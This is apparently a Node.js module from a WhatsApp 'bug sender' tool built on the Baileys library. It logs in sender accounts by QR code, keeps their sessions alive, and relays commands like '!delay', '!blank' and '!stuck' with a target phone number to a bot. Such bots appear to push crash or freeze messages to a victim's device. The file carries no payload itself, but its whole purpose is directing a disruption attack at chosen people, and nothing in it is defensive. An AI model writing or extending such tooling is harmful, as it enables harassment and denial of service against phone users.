import { makeWASocket, useMultiFileAuthState, delay } from '@whiskeysockets/baileys';
import qrcode from 'qrcode-terminal';
import { Sender } from './db.js';

// Store active connections
const activeConnections = new Map();

export async function initSenderConnection(senderId) {
  try {
    const sender = await Sender.findByPk(senderId);
    if (!sender) throw new Error('Sender not found');

    // Update sender status
    await sender.update({ status: 'connecting' });

    const authFolder = `./auth_sessions/sender_${senderId}`;
    const { state, saveCreds } = await useMultiFileAuthState(authFolder);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      browser: [`Bug Sender ${sender.phone}`, 'Chrome', '1.0.0'],
      logger: {
        level: 'silent'
      }
    });

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;
      
      if (qr) {
        console.log(`QR for sender ${sender.phone}:`);
        qrcode.generate(qr, { small: true });
        // Store QR for frontend
        activeConnections.set(senderId, { 
          ...activeConnections.get(senderId), 
          qrCode: qr 
        });
      }
      
      if (connection === 'close') {
        console.log(`Sender ${sender.phone} disconnected`);
        await sender.update({ status: 'disconnected' });
        
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== 401;
        if (shouldReconnect) {
          setTimeout(() => initSenderConnection(senderId), 5000);
        }
      } 
      else if (connection === 'open') {
        console.log(`Sender ${sender.phone} connected!`);
        await sender.update({ status: 'connected' });
        activeConnections.set(senderId, { sock, qrCode: null });
      }
    });

    sock.ev.on('creds.update', saveCreds);

    activeConnections.set(senderId, { sock, qrCode: null });
    return { success: true, qrCode: null };

  } catch (error) {
    console.error('Error initializing sender:', error);
    await Sender.update({ status: 'disconnected' }, { where: { id: senderId } });
    return { success: false, error: error.message };
  }
}

export async function sendBugCommand(senderId, targetPhone, bugType) {
  try {
    const connection = activeConnections.get(senderId);
    if (!connection || !connection.sock) {
      throw new Error('Sender not connected');
    }

    const command = formatBugCommand(bugType, targetPhone);
    
    // Send to yourself (the bot number)
    await connection.sock.sendMessage(connection.sock.user.id, { 
      text: command 
    });

    return { success: true, message: `Bug ${bugType} sent to ${targetPhone}` };

  } catch (error) {
    console.error('Error sending bug:', error);
    return { success: false, error: error.message };
  }
}

function formatBugCommand(bugType, targetPhone) {
  const commands = {
    delay: `!delay ${targetPhone}`,
    blank: `!blank ${targetPhone}`,
    stuck: `!stuck ${targetPhone}`
  };
  return commands[bugType] || `!bug ${bugType} ${targetPhone}`;
}

export function getSenderConnection(senderId) {
  return activeConnections.get(senderId);
}

export function getQRCode(senderId) {
  const connection = activeConnections.get(senderId);
  return connection?.qrCode || null;
}
